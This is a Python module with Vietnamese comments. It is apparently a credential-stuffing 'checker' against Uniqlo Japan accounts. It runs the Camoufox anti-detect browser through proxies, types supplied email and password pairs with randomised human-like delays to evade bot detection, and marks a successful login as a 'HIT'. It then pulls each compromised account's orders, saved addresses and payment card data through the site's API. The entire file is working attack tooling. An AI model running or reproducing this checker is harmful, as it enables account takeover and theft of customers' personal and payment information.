"""
Camoufox Cookie Getter Module for Uniqlo JP
Sử dụng Camoufox (anti-detect browser) để lấy cookies và login
"""

import asyncio
import time
import random
from colorama import Fore

try:
    from camoufox.async_api import AsyncCamoufox
except ImportError:
    print("❌ Lỗi: Chưa cài đặt camoufox!")
    print("💡 Chạy: pip install camoufox playwright")
    raise


class CamoufoxCookieGetter:
    """Lấy cookies và login bằng Camoufox (anti-detect browser)"""

    def __init__(self, proxy=None, headless=False, debug=False):
        self.proxy = proxy
        self.headless = headless
        self.debug = debug
        
    def debug_log(self, message):
        """Debug logging"""
        if self.debug:
            print(f"{Fore.CYAN}[CAMOUFOX] {message}")
    
    async def login_and_check_async(self, email, password, timeout=30000):
        """
        Login bằng Camoufox và check HIT
        
        Args:
            email: Email to login
            password: Password to login
            timeout: Timeout in milliseconds
            
        Returns:
            tuple: (is_hit, account_info, user_agent, message)
        """
        browser = None
        page = None
        
        try:
            self.debug_log(f"Starting Camoufox...")
            
            # Parse proxy cho Camoufox
            proxy_config = None
            
            if self.proxy:
                proxy_url = self.proxy.get('http', '') or self.proxy.get('https', '')
                
                if proxy_url:
                    if '@' in proxy_url:
                        # Has auth: http://user:pass@ip:port
                        protocol_and_auth, server_part = proxy_url.split('@')
                        protocol = protocol_and_auth.split('://')[0]
                        auth_part = protocol_and_auth.split('://')[1]
                        
                        if ':' in auth_part:
                            username, password_str = auth_part.split(':', 1)
                        else:
                            username = auth_part
                            password_str = ''
                        
                        server = f"{protocol}://{server_part}"
                        
                        proxy_config = {
                            'server': server,
                            'username': username,
                            'password': password_str
                        }
                        
                        safe_server = server_part
                        self.debug_log(f"Using proxy with auth: {safe_server}")
                    else:
                        # No auth
                        proxy_config = {'server': proxy_url}
                        self.debug_log(f"Using proxy without auth: {proxy_url}")
            
            # Launch Camoufox với anti-detect features
            self.debug_log(f"Launching Camoufox (headless={self.headless})...")

            launch_options = {
                'headless': self.headless,
                # geoip=True requires extra install: pip install camoufox[geoip]
                # Bỏ geoip để tránh lỗi NotInstalledGeoIPExtra
            }
            
            if proxy_config:
                launch_options['proxy'] = proxy_config
                print(f"{Fore.MAGENTA}[PROXY] Server: {proxy_config.get('server', 'N/A')}")
                print(f"{Fore.MAGENTA}[PROXY] Username: {proxy_config.get('username', 'N/A')}")
            else:
                print(f"{Fore.YELLOW}[PROXY] ⚠️  Running WITHOUT proxy")
            
            async with AsyncCamoufox(**launch_options) as browser:
                # Create page
                page = await browser.new_page()

                # Set timeouts (giống Playwright)
                page.set_default_navigation_timeout(180000)  # 180s
                page.set_default_timeout(60000)  # 60s
                self.debug_log(f"✅ Set navigation timeout: 180s, default timeout: 60s")

                # Get user agent
                user_agent = await page.evaluate("navigator.userAgent")
                self.debug_log(f"User-Agent: {user_agent[:80]}...")

                # ===== STEP 1: Navigate and wait for login page (PROGRESSIVE TIMEOUT STRATEGY) =====
                print(f"{Fore.CYAN}[{email}] Step 1: Loading wishlist (will redirect to login)...")

                start_time = time.time()

                # Try với timeout tăng dần (progressive timeout strategy - giống Playwright)
                timeouts_to_try = [120000, 180000]  # 120s, then 180s if first fails
                last_error = None

                for attempt_idx, current_timeout in enumerate(timeouts_to_try, 1):
                    try:
                        timeout_sec = current_timeout / 1000
                        if attempt_idx > 1:
                            print(f"{Fore.YELLOW}[{email}] ⏳ Retry #{attempt_idx} with timeout: {timeout_sec}s...")
                            # Reload page nếu retry
                            try:
                                await page.reload(wait_until="domcontentloaded", timeout=30000)
                            except:
                                pass  # Ignore reload errors
                        else:
                            print(f"{Fore.CYAN}[{email}] ⏳ Loading page (timeout: {timeout_sec}s)...")

                        # Navigate với timeout hiện tại
                        print(f"{Fore.CYAN}[{email}] → Navigating to wishlist page...")
                        await page.goto("https://www.uniqlo.com/jp/ja/wishlist", wait_until="domcontentloaded", timeout=current_timeout)

                        # ⚠️ CRITICAL: Đợi trang load HOÀN TOÀN
                        print(f"{Fore.CYAN}[{email}] → Waiting for page to fully load...")

                        # Step 1: Wait for load state
                        try:
                            await page.wait_for_load_state("load", timeout=30000)
                            print(f"{Fore.CYAN}[{email}]   ✓ Page 'load' event fired")
                        except Exception as e:
                            print(f"{Fore.YELLOW}[{email}]   ⚠️  'load' event timeout, continuing...")

                        # Step 2: Wait for network idle (quan trọng!)
                        try:
                            await page.wait_for_load_state("networkidle", timeout=30000)
                            print(f"{Fore.CYAN}[{email}]   ✓ Network idle")
                        except Exception as e:
                            print(f"{Fore.YELLOW}[{email}]   ⚠️  Network idle timeout, continuing...")

                        # Step 3: Wait for login form to appear
                        print(f"{Fore.CYAN}[{email}] → Waiting for login form to appear...")
                        await page.wait_for_selector('#email-input', timeout=60000, state="visible")
                        print(f"{Fore.CYAN}[{email}]   ✓ Login form found")

                        # Step 4: Extra wait để đảm bảo form ready
                        await asyncio.sleep(2)

                        elapsed = time.time() - start_time
                        print(f"{Fore.GREEN}[{email}] ✅ Login page fully loaded in {elapsed:.1f}s")
                        print(f"{Fore.CYAN}[{email}] Current URL: {page.url}")

                        # Success - break khỏi retry loop
                        last_error = None
                        break

                    except Exception as e:
                        elapsed = time.time() - start_time
                        error_msg = str(e)
                        last_error = e

                        # Phân loại lỗi
                        is_timeout = 'Timeout' in error_msg or 'timeout' in error_msg
                        is_network_error = any(keyword in error_msg for keyword in [
                            'ERR_TIMED_OUT', 'ERR_CONNECTION', 'ERR_PROXY',
                            'ERR_TUNNEL', 'ERR_NAME_NOT_RESOLVED',
                            'net::ERR', 'NS_ERROR'
                        ])

                        # Check if this is the last attempt
                        if attempt_idx >= len(timeouts_to_try):
                            if is_timeout:
                                print(f"{Fore.RED}[{email}] ❌ Timeout after {elapsed:.1f}s (tried all timeouts)")
                            elif is_network_error:
                                print(f"{Fore.RED}[{email}] ❌ Network error persists (tried all timeouts)")
                            else:
                                print(f"{Fore.RED}[{email}] ❌ Error loading page")
                            print(f"{Fore.RED}[{email}] Error: {error_msg[:150]}")
                            raise Exception(f"Page load failed after {elapsed:.1f}s - {error_msg[:100]}")
                        else:
                            if is_timeout or is_network_error:
                                print(f"{Fore.YELLOW}[{email}] ⚠️  Error after {elapsed:.1f}s, will retry with longer timeout...")
                                print(f"{Fore.YELLOW}[{email}] Error: {error_msg[:100]}")
                                await asyncio.sleep(2)  # Wait before retry
                                continue
                            else:
                                # Non-network/timeout errors - raise immediately
                                print(f"{Fore.RED}[{email}] ❌ Error loading page: {error_msg[:150]}")
                                raise

                # If we exited loop with error, raise it
                if last_error:
                    raise last_error
                
                # ===== STEP 2: Fill login form (HUMAN-LIKE TYPING) =====
                print(f"{Fore.CYAN}[{email}] Step 2: Filling login form...")

                # Đảm bảo email input ready
                print(f"{Fore.CYAN}[{email}] → Waiting for email input to be ready...")
                email_input = await page.wait_for_selector('#email-input', timeout=10000, state="visible")

                # Check if input is enabled
                is_enabled = await page.is_enabled('#email-input')
                if not is_enabled:
                    print(f"{Fore.YELLOW}[{email}]   ⚠️  Email input not enabled, waiting...")
                    await asyncio.sleep(2)

                # Click vào input để focus (giống người dùng thật)
                print(f"{Fore.CYAN}[{email}] → Clicking email input to focus...")
                await page.click('#email-input')
                await asyncio.sleep(random.uniform(0.3, 0.7))  # Random delay sau khi click

                # Clear input trước (nếu có giá trị cũ)
                await page.fill('#email-input', '')
                await asyncio.sleep(0.2)

                # Type email từng ký tự (mô phỏng người dùng thật)
                print(f"{Fore.CYAN}[{email}] → Typing email character by character...")
                typing_delay = random.randint(50, 150)  # Random delay 50-150ms giữa các ký tự
                await page.type('#email-input', email, delay=typing_delay)
                print(f"{Fore.CYAN}[{email}]   ✓ Email typed (delay: {typing_delay}ms/char)")

                # Random delay giữa email và password (giống người dùng thật)
                await asyncio.sleep(random.uniform(0.8, 1.5))

                # Đảm bảo password input ready
                print(f"{Fore.CYAN}[{email}] → Waiting for password input to be ready...")
                password_input = await page.wait_for_selector('#password-input', timeout=10000, state="visible")

                # Check if input is enabled
                is_enabled = await page.is_enabled('#password-input')
                if not is_enabled:
                    print(f"{Fore.YELLOW}[{email}]   ⚠️  Password input not enabled, waiting...")
                    await asyncio.sleep(2)

                # Click vào password input để focus
                print(f"{Fore.CYAN}[{email}] → Clicking password input to focus...")
                await page.click('#password-input')
                await asyncio.sleep(random.uniform(0.3, 0.7))  # Random delay sau khi click

                # Clear input trước (nếu có giá trị cũ)
                await page.fill('#password-input', '')
                await asyncio.sleep(0.2)

                # Type password từng ký tự (mô phỏng người dùng thật)
                print(f"{Fore.CYAN}[{email}] → Typing password character by character...")
                typing_delay = random.randint(50, 150)  # Random delay 50-150ms giữa các ký tự
                await page.type('#password-input', password, delay=typing_delay)
                print(f"{Fore.CYAN}[{email}]   ✓ Password typed (delay: {typing_delay}ms/char)")

                # Random delay trước khi click submit (giống người dùng thật)
                await asyncio.sleep(random.uniform(0.8, 1.5))

                print(f"{Fore.GREEN}[{email}] ✅ Form filled successfully (human-like typing)")
                
                # ===== STEP 3: Click login and wait for result page =====
                print(f"{Fore.CYAN}[{email}] Step 3: Clicking login...")

                # Đảm bảo login button ready
                print(f"{Fore.CYAN}[{email}] → Waiting for login button to be ready...")
                login_button = await page.wait_for_selector("button[type='submit'].fr-ec-button--variant-primary", timeout=15000, state="visible")

                # Check if button is enabled
                is_enabled = await page.is_enabled("button[type='submit'].fr-ec-button--variant-primary")
                if not is_enabled:
                    print(f"{Fore.YELLOW}[{email}]   ⚠️  Login button not enabled, waiting...")
                    await asyncio.sleep(2)

                print(f"{Fore.CYAN}[{email}]   ✓ Login button ready")

                # Lưu URL trước khi click để so sánh
                url_before_login = page.url
                print(f"{Fore.CYAN}[{email}] URL before login: {url_before_login}")

                start_time = time.time()
                print(f"{Fore.CYAN}[{email}] Clicking login button...")

                # ⚠️ CRITICAL FIX: KHÔNG dùng expect_navigation vì khi sai password trang không redirect
                # → expect_navigation sẽ timeout
                # Thay vào đó: Click rồi poll URL và error messages

                await page.click("button[type='submit'].fr-ec-button--variant-primary")
                print(f"{Fore.CYAN}[{email}]   ✓ Button clicked")

                # Đợi 5s cho trang xử lý (giống Playwright)
                print(f"{Fore.CYAN}[{email}] → Waiting 5s for page to process...")
                await asyncio.sleep(5)

                # ===== POLLING LOGIC: Check result every 2s for max 30s =====
                print(f"{Fore.CYAN}[{email}] → Checking result (polling every 2s, max 30s)...")

                max_wait = 30  # 30 seconds total (đã đợi 5s ở trên, còn 25s)
                poll_interval = 2  # Check every 2 seconds
                login_result = None  # 'success', 'failed', or None
                error_message = ""

                error_selectors = [
                    "div.fr-ec-form-error-message",
                    "div[role='alert']",
                    "p.fr-ec-form-error-message__text",
                    ".error-message",
                    ".alert-danger",
                    ".fr-ec-alert--error",
                    ".fr-ec-form-field__error",
                    ".fr-ec-alert"
                ]

                for i in range(int(max_wait / poll_interval)):
                    await asyncio.sleep(poll_interval)
                    elapsed = time.time() - start_time

                    current_url = page.url
                    print(f"{Fore.CYAN}[{email}]   Poll #{i+1} ({elapsed:.1f}s): {current_url[:80]}...")

                    # Check 1: URL đã thay đổi? → Success
                    if current_url != url_before_login:
                        print(f"{Fore.GREEN}[{email}]   ✓ URL changed! Login may be successful")
                        login_result = 'success'
                        break

                    # Check 2: Có error message? → Failed
                    print(f"{Fore.CYAN}[{email}]   → Checking for error messages...")

                    error_found = False
                    for selector in error_selectors:
                        try:
                            error_elem = await page.query_selector(selector)
                            if error_elem:
                                is_visible = await error_elem.is_visible()
                                if is_visible:
                                    error_text = await error_elem.inner_text()
                                    error_text = error_text.strip() if error_text else ""

                                    # Filter: bỏ qua text ngắn hoặc không phải error
                                    if error_text and len(error_text) >= 5:
                                        # Bỏ qua page title
                                        if 'ユニクロ公式' in error_text or 'uniqlo' in error_text.lower():
                                            continue

                                        # Đây là error message thật
                                        error_message = error_text
                                        print(f"{Fore.RED}[{email}]   ✗ Error message found: {error_message[:100]}")
                                        error_found = True
                                        break
                        except:
                            continue

                    if error_found:
                        print(f"{Fore.RED}[{email}] ❌ Login failed - error detected: {error_message[:100]}")
                        login_result = 'failed'
                        break

                    # Chưa có kết quả → continue polling
                    print(f"{Fore.YELLOW}[{email}]   ⚠️  No change yet, continue polling...")

                # Sau khi poll xong
                elapsed = time.time() - start_time

                # ===== STEP 4: Check login result =====
                print(f"{Fore.CYAN}[{email}] Step 4: Checking login result...")

                final_url = page.url
                print(f"{Fore.CYAN}[{email}] Final URL: {final_url}")

                # Nếu login_result = 'failed' → chắc chắn là invalid credentials
                if login_result == 'failed':
                    return False, {}, user_agent, f"Login failed: {error_message}"

                # Check nếu vẫn ở login page → FAIL
                if '/auth/' in final_url.lower() and 'login' in final_url.lower():
                    print(f"{Fore.RED}[{email}] ❌ FAIL - Still on login page")
                    return False, {}, user_agent, "Login failed: Invalid credentials - Still on login page"

                # ✅ URL đã thay đổi và KHÔNG phải login page → SUCCESS!
                if final_url != url_before_login and 'login' not in final_url.lower():
                    print(f"{Fore.GREEN}[{email}] ✅ Login successful in {elapsed:.1f}s!")

                    # Wait thêm cho page stable
                    print(f"{Fore.CYAN}[{email}] → Waiting for page to be stable...")
                    await asyncio.sleep(3)

                    try:
                        await page.wait_for_load_state("networkidle", timeout=15000)
                        print(f"{Fore.CYAN}[{email}]   ✓ Network idle")
                    except:
                        print(f"{Fore.YELLOW}[{email}]   ⚠️  Network idle timeout, continuing...")

                    # ===== STEP 5: Fetch account info (WITH RETRY LOGIC) =====
                    print(f"{Fore.CYAN}[{email}] Step 5: Fetching account info...")
                    self.debug_log("=" * 60)
                    self.debug_log("Getting account info via API in browser...")

                    account_info = {
                        'orders': None,
                        'addresses': None,
                        'cards': None
                    }

                    # API endpoints
                    orders_api = "https://www.uniqlo.com/jp/api/commerce/v5/ja/orders?offset=1&limit=5&imageRatio=3x4&includeLegacy=false&httpFailure=true"
                    addresses_api = "https://www.uniqlo.com/jp/api/commerce/v5/ja/addresses?httpFailure=true"
                    cards_api = "https://www.uniqlo.com/jp/api/commerce/v5/ja/cards?httpFailure=true"

                    # 1. Get orders info (retry 3 lần)
                    orders_success = False
                    for retry in range(3):
                        try:
                            self.debug_log(f"Fetching orders info (attempt {retry+1}/3)...")
                            orders_response = await page.evaluate(f"""
                                async () => {{
                                    const response = await fetch('{orders_api}', {{
                                        method: 'GET',
                                        headers: {{
                                            'Accept': 'application/json',
                                            'Referer': 'https://www.uniqlo.com/jp/ja/member/orders/online-store'
                                        }},
                                        credentials: 'include'
                                    }});
                                    return await response.json();
                                }}
                            """)
                            account_info['orders'] = orders_response
                            self.debug_log(f"✓ Orders: {orders_response.get('status', 'N/A')}")
                            print(f"{Fore.GREEN}[{email}]   ✓ Orders fetched")
                            orders_success = True
                            break
                        except Exception as e:
                            self.debug_log(f"✗ Failed to get orders (attempt {retry+1}/3): {e}")
                            if retry < 2:
                                await asyncio.sleep(1)
                            else:
                                print(f"{Fore.YELLOW}[{email}]   ⚠️  Failed to fetch orders after 3 attempts")
                                account_info['orders'] = None

                    # 2. Get addresses info (retry 3 lần)
                    addresses_success = False
                    for retry in range(3):
                        try:
                            self.debug_log(f"Fetching addresses info (attempt {retry+1}/3)...")
                            addresses_response = await page.evaluate(f"""
                                async () => {{
                                    const response = await fetch('{addresses_api}', {{
                                        method: 'GET',
                                        headers: {{
                                            'Accept': 'application/json',
                                            'Referer': 'https://www.uniqlo.com/jp/ja/member/address-book'
                                        }},
                                        credentials: 'include'
                                    }});
                                    return await response.json();
                                }}
                            """)
                            account_info['addresses'] = addresses_response
                            self.debug_log(f"✓ Addresses: {addresses_response.get('status', 'N/A')}")
                            print(f"{Fore.GREEN}[{email}]   ✓ Addresses fetched")
                            addresses_success = True
                            break
                        except Exception as e:
                            self.debug_log(f"✗ Failed to get addresses (attempt {retry+1}/3): {e}")
                            if retry < 2:
                                await asyncio.sleep(1)
                            else:
                                print(f"{Fore.YELLOW}[{email}]   ⚠️  Failed to fetch addresses after 3 attempts")
                                account_info['addresses'] = None

                    # 3. Get cards info (retry 3 lần)
                    cards_success = False
                    for retry in range(3):
                        try:
                            self.debug_log(f"Fetching cards info (attempt {retry+1}/3)...")
                            cards_response = await page.evaluate(f"""
                                async () => {{
                                    const response = await fetch('{cards_api}', {{
                                        method: 'GET',
                                        headers: {{
                                            'Accept': 'application/json',
                                            'Referer': 'https://www.uniqlo.com/jp/ja/member/payment-methods'
                                        }},
                                        credentials: 'include'
                                    }});
                                    return await response.json();
                                }}
                            """)
                            account_info['cards'] = cards_response
                            self.debug_log(f"✓ Cards: {cards_response.get('status', 'N/A')}")
                            print(f"{Fore.GREEN}[{email}]   ✓ Cards fetched")
                            cards_success = True
                            break
                        except Exception as e:
                            self.debug_log(f"✗ Failed to get cards (attempt {retry+1}/3): {e}")
                            if retry < 2:
                                await asyncio.sleep(1)
                            else:
                                print(f"{Fore.YELLOW}[{email}]   ⚠️  Failed to fetch cards after 3 attempts")
                                account_info['cards'] = None

                    self.debug_log("=" * 60)
                    return True, account_info, user_agent, "Login successful"

                else:
                    # Timeout - không có URL change và không có error
                    print(f"{Fore.RED}[{email}] ❌ Timeout after {elapsed:.1f}s - no URL change or error")

                    # Check xem có còn ở trang login không
                    is_still_on_login_page = (
                        '/auth/' in final_url and 'login' in final_url.lower()
                    ) or (
                        'login' in final_url.lower() and 'uniqlo.com' in final_url
                    )

                    if is_still_on_login_page:
                        print(f"{Fore.RED}[{email}]   ✗ Still on login page → Invalid credentials")
                        return False, {}, user_agent, "Login failed: Invalid credentials (timeout on login page)"
                    else:
                        # Không phải trang login → có thể đang load chậm, coi như failed
                        print(f"{Fore.RED}[{email}]   ✗ Unknown state after timeout")
                        return False, {}, user_agent, "Login failed: Timeout - unknown state"
        
        except Exception as e:
            error_msg = str(e)
            print(f"{Fore.RED}[{email}] ❌ Exception: {error_msg[:200]}")
            raise
    
    def login_and_check(self, email, password, timeout=30000):
        """
        Sync wrapper for async login_and_check_async
        """
        return asyncio.run(self.login_and_check_async(email, password, timeout))

